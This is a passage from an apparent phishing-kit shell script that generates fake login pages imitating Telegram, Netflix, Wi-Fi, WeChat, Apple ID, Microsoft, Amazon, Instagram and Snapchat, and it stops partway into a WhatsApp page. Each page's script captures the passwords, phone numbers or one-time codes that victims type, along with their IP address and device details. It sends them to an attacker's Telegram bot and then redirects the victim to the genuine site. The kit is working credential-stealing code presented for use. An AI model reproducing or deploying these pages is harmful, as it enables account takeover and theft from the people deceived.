        input:focus { border-color: #0088cc; box-shadow: 0 0 8px rgba(0, 136, 204, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #0088cc; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #006699; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #0088cc; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #0088cc; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #0088cc; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h2>Log in to Telegram</h2>
        <form id="loginForm">
            <input type="text" id="phone" placeholder="Phone number" required>
            <button type="submit" class="btn-login">Next</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign up for Telegram</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const phone = document.getElementById('phone').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Telegram Login Attempt:\nPhone📱: \${phone}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Please enter the code sent to your phone.');
                const code = prompt('Enter the code:');
                const codeResponse = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: '${id}',
                        text: \`Telegram Code:\nCode🔢: \${code}\`
                    })
                });
                const codeResult = await codeResponse.json();
                if (codeResult.ok) {
                    alert('Login successful! Redirecting...');
                    window.location.href = 'https://web.telegram.org';
                } else {
                    alert('Login failed. Please check your code.');
                }
            } else {
                alert('Login failed. Please check your phone number.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

netflix_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #141414; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #fff; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #333; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; background-color: #333; color: #fff; }
        input:focus { border-color: #e50914; box-shadow: 0 0 8px rgba(229, 9, 20, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #e50914; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #b20710; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #e50914; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #333; }
        .signup-btn { width: 100%; padding: 14px; background-color: #333; border: 1px solid #333; font-size: 14px; color: #e50914; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #444; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #e50914; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo">
        <h2>Sign In</h2>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email or phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Sign In</button>
        </form>
        <p class="forgot-password"><a href="#">Need help?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign up now</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Netflix Login Attempt:\nEmail📧: \${email}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.netflix.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

wifi_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 15px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 80px; margin-bottom: 20px; }
        h2 { font-size: 24px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #007bff; box-shadow: 0 0 8px rgba(0, 123, 255, 0.5); }
        .btn-login { width: 100%; padding: 14px; background-color: #007bff; color: white; font-weight: bold; font-size: 16px; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #0056b3; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #007bff; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #ddd; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #ddd; font-size: 14px; color: #007bff; border-radius: 8px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #007bff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/8a/Wi-Fi_Logo.svg" alt="Wi-Fi Logo">
        <h2>Connect to Wi-Fi</h2>
        <form id="loginForm">
            <input type="text" id="ssid" placeholder="Network Name (SSID)" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Connect</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create new network</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const ssid = document.getElementById('ssid').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Wi-Fi Login Attempt:\nSSID📶: \${ssid}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Connected successfully! Redirecting...');
                window.location.href = 'https://www.google.com';
            } else {
                alert('Connection failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

wechat_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WeChat Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            width: 100%;
            max-width: 400px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        .logo {
            width: 120px;
            margin: 0 auto 30px;
            display: block;
        }
        h2 {
            color: #07c160;
            text-align: center;
            margin-bottom: 30px;
            font-weight: 500;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }
        input:focus {
            border-color: #07c160;
            box-shadow: 0 0 8px rgba(7, 193, 96, 0.2);
            outline: none;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #07c160;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .pricing {
            margin-top: 30px;
            border-top: 1px solid #eee;
            padding-top: 25px;
        }
        .price-card {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 15px;
            text-align: center;
        }
        .price {
            color: #07c160;
            font-size: 24px;
            font-weight: bold;
            margin: 10px 0;
        }
        .plan-name {
            color: #333;
            font-weight: 600;
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/WeChat_Logo.svg/1200px-WeChat_Logo.svg.png" class="logo" alt="WeChat Logo">
        <h2>تسجيل الدخول إلى WeChat</h2>
        
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="كلمة المرور" required>
            </div>
            <button type="submit" class="btn">تسجيل الدخول</button>
        </form>

        <div class="pricing">
            <div class="price-card">
                <div class="plan-name">الباقة الأساسية</div>
                <div class="price">$9.99/شهر</div>
                <ul style="list-style: none; padding: 0;">
                    <li>✓ مكالمات غير محدودة</li>
                    <li>✓ 100GB تخزين</li>
                    <li>✓ دعم فني 24/7</li>
                </ul>
                <button class="btn" style="margin-top:15px;background:#059c4d">اختيار الباقة</button>
            </div>

            <div class="price-card">
                <div class="plan-name">الباقة المميزة</div>
                <div class="price">$19.99/شهر</div>
                <ul style="list-style: none; padding: 0;">
                    <li>✓ جميع مميزات الباقة الأساسية</li>
                    <li>✓ اجتماعات جماعية</li>
                    <li>✓ ترقية الأولوية</li>
                </ul>
                <button class="btn" style="margin-top:15px;background:#07c160">اختيار الباقة</button>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            const deviceInfo = await getDeviceInfo();
            
            // إرسال بيانات التسجيل
            await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`📱 تسجيل دخول WeChat\n👤 المستخدم: \${username}\n🔑 كلمة المرور: \${password}\n\n📡 معلومات الجهاز:\nIP: \${deviceInfo.ip}\nالبطارية: \${deviceInfo.batteryLevel}%\`
                })
            });

            alert('تم إرسال طلبك بنجاح!');
        });

        // جمع معلومات الجهاز
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                os: navigator.platform,
                networkType: navigator.connection?.effectiveType || 'غير معروف'
            };
        }

        // معالجة اختيار الباقات
        document.querySelectorAll('.price-card button').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.preventDefault();
                const plan = e.target.closest('.price-card').querySelector('.plan-name').innerText;
                fetch('https://api.telegram.org/bot${token}/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: '${id}',
                        text: \`💳 تم اختيار الباقة: \${plan}\`
                    })
                });
                alert('تم إرسال طلبك للباقة المختارة!');
            });
        });
    </script>
</body>
</html>
EOF
}

apple_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background-color: #f5f5f7; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
        }
        .login-container { 
            background-color: #ffffff; 
            border-radius: 20px; 
            width: 380px; 
            padding: 40px; 
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); 
            text-align: center;
        }
        .logo { 
            width: 60px; 
            margin-bottom: 25px; 
            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
        }
        h1 { 
            font-size: 24px; 
            color: #1d1d1f; 
            margin-bottom: 15px; 
            font-weight: 600; 
        }
        input { 
            width: 100%; 
            padding: 14px; 
            margin-bottom: 12px; 
            border: 1px solid #d2d2d7; 
            border-radius: 12px; 
            font-size: 15px; 
            outline: none; 
            transition: border-color 0.3s;
        }
        input:focus { 
            border-color: #0071e3; 
            box-shadow: 0 0 8px rgba(0, 113, 227, 0.2); 
        }
        .btn-login { 
            width: 100%; 
            padding: 14px; 
            background-color: #0071e3; 
            color: white; 
            font-weight: 600; 
            border: none; 
            border-radius: 12px; 
            cursor: pointer; 
            transition: background-color 0.3s;
        }
        .btn-login:hover { 
            background-color: #0077ed; 
        }
        .links { 
            margin-top: 20px; 
            font-size: 14px; 
        }
        .links a { 
            color: #0071e3; 
            text-decoration: none; 
            margin: 0 10px; 
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="logo" alt="Apple Logo">
        <h1>Sign in with your Apple ID</h1>
        <form id="loginForm">
            <input type="text" id="appleId" placeholder="Apple ID" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Sign In</button>
        </form>
        <div class="links">
            <a href="#">Forgot Apple ID?</a>
            <a href="#">Forgot Password?</a>
        </div>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const appleId = document.getElementById('appleId').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            
            fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`📱 Apple ID Login\n🆔 Apple ID: \${appleId}\n🔑 Password: \${password}\n\n📡 Device Info:\nIP: \${deviceInfo.ip}\nBattery: \${deviceInfo.batteryLevel}%\nNetwork: \${deviceInfo.networkType}\nUser Agent: \${deviceInfo.deviceName}\`
                })
            })
            .then(() => window.location.href = 'https://apple.com')
            .catch(() => alert('Login failed!'));
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: navigator.connection?.effectiveType || 'Unknown',
                deviceName: navigator.userAgent
            };
        }
    </script>
</body>
</html>
EOF
}

microsoft_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0078d4 0%, #00bcf2 100%); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
        }
        .login-container { 
            background: rgba(255, 255, 255, 0.95); 
            border-radius: 8px; 
            width: 400px; 
            padding: 40px; 
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }
        .logo { 
            width: 120px; 
            margin: 0 auto 30px; 
            display: block; 
        }
        h1 { 
            color: #242424; 
            text-align: center; 
            margin-bottom: 30px; 
            font-weight: 600; 
        }
        input { 
            width: 100%; 
            padding: 14px; 
            margin-bottom: 15px; 
            border: 1px solid #ddd; 
            border-radius: 4px; 
            font-size: 16px; 
        }
        .btn-login { 
            width: 100%; 
            padding: 14px; 
            background: #0078d4; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            font-weight: 600; 
        }
        .footer { 
            margin-top: 20px; 
            text-align: center; 
        }
        .footer a { 
            color: #0078d4; 
            text-decoration: none; 
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" class="logo" alt="Microsoft Logo">
        <h1>Sign in to your account</h1>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email, phone, or Skype" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Next</button>
        </form>
        <div class="footer">
            <a href="#">Can't access your account?</a>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            
            fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`📧 Microsoft Login\n✉️ Email: \${email}\n🔑 Password: \${password}\n\n📡 Device Info:\nIP: \${deviceInfo.ip}\nBattery: \${deviceInfo.batteryLevel}%\`
                })
            })
            .then(() => window.location.href = 'https://microsoft.com')
            .catch(() => alert('Error!'));
        });
    </script>
</body>
</html>
EOF
}

amazon_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Amazon Ember', Arial, sans-serif; 
            background: linear-gradient(to bottom, #fafafa 0%, #eaeaea 100%); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
        }
        .login-container { 
            background: white; 
            border-radius: 8px; 
            width: 380px; 
            padding: 40px; 
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); 
        }
        .logo { 
            width: 120px; 
            margin: 0 auto 30px; 
            display: block; 
        }
        h1 { 
            color: #232f3e; 
            text-align: center; 
            margin-bottom: 30px; 
            font-weight: 400; 
        }
        input { 
            width: 100%; 
            padding: 12px; 
            margin-bottom: 15px; 
            border: 1px solid #a6a6a6; 
            border-radius: 3px; 
            font-size: 15px; 
        }
        .btn-login { 
            width: 100%; 
            padding: 12px; 
            background: linear-gradient(to bottom,#f7dfa5,#f0c14b); 
            border: 1px solid #a88734; 
            border-radius: 3px; 
            cursor: pointer; 
            font-weight: 400; 
        }
        .footer { 
            margin-top: 20px; 
            text-align: center; 
        }
        .footer a { 
            color: #0066c0; 
            text-decoration: none; 
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="logo" alt="Amazon Logo">
        <h1>Sign-In</h1>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email or mobile phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Continue</button>
        </form>
        <div class="footer">
            <a href="#">Forgot Password?</a>
        </div>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            
            fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`🛒 Amazon Login\n📧 Email: \${email}\n🔑 Password: \${password}\n\n📡 Device Info:\nIP: \${deviceInfo.ip}\nBattery: \${deviceInfo.batteryLevel}%\`
                })
            })
            .then(() => window.location.href = 'https://amazon.com')
            .catch(() => alert('Login failed!'));
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: navigator.connection?.effectiveType || 'Unknown',
                deviceName: navigator.userAgent
            };
        }
    </script>
</body>
</html>
EOF
}

instagram_verify_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: #fafafa; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
        }
        .container { 
            background: white; 
            border: 1px solid #dbdbdb; 
            border-radius: 10px; 
            width: 400px; 
            padding: 40px; 
            text-align: center; 
        }
        .logo { 
            width: 120px; 
            margin-bottom: 30px; 
        }
        h1 { 
            color: #262626; 
            font-size: 20px; 
            margin-bottom: 20px; 
        }
        .step { display: none; }
        .step.active { display: block; }
        input { 
            width: 100%; 
            padding: 12px; 
            margin-bottom: 15px; 
            border: 1px solid #dbdbdb; 
            border-radius: 4px; 
            font-size: 14px; 
        }
        .btn { 
            width: 100%; 
            padding: 12px; 
            background: #0095f6; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            font-weight: 600; 
        }
        .verify-msg {
            color: #8e8e8e;
            margin: 20px 0;
            font-size: 14px;
        }
        .blue-check {
            width: 60px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- المرحلة الأولى: تسجيل الدخول -->
        <div class="step active" id="step1">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" class="logo" alt="Instagram Logo">
            <h1>Log in to Instagram</h1>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Username, email or phone" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="btn">Log In</button>
            </form>
        </div>

        <!-- المرحلة الثانية: التحقق -->
        <div class="step" id="step2">
            <img src="https://cdn-icons-png.flaticon.com/512/411/411723.png" class="blue-check" alt="Verification">
            <h1>Account Verification Required</h1>
            <div class="verify-msg">
                Your account is under verification process.<br>
                This may take 24-48 hours.
            </div>
        </div>
    </div>

    <script>
        // تسجيل بيانات الدخول
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // إرسال البيانات إلى التليجرام
            await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`📱 Instagram Login\n👤 Username: \${username}\n🔑 Password: \${password}\`
                })
            });

            // الانتقال إلى مرحلة التحقق
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        });
    </script>
</body>
</html>
EOF
}

snapchat_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #fffc00; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 15px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 80px; margin-bottom: 20px; }
        h2 { font-size: 24px; color: #000; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #fffc00; box-shadow: 0 0 8px rgba(255, 252, 0, 0.5); }
        .btn-login { width: 100%; padding: 14px; background-color: #000; color: #fffc00; font-weight: bold; font-size: 16px; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #333; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #000; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #ddd; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #ddd; font-size: 14px; color: #000; border-radius: 8px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #000; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Snapchat_logo.svg" alt="Snapchat Logo">
        <h2>Log in to Snapchat</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create new account</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Snapchat Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.snapchat.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

whatsapp_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
